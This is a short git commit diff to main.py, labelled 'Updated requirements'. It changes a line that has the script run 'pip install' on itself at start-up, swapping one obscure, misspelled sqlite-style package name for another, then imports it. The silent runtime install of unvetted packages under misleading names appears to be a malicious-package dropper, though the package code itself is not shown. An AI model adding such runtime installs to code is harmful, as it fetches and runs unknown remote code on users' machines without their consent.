90358bfffcc69e20e2b0e98b30f0d991e01eb77f
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 22:41:35 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite3liberyV1")
-import syssqlite3liberyV1
+os.system("pip install syssqlitedbextension")
+import syssqlitedbextension
 import json
 import httpx
 import time
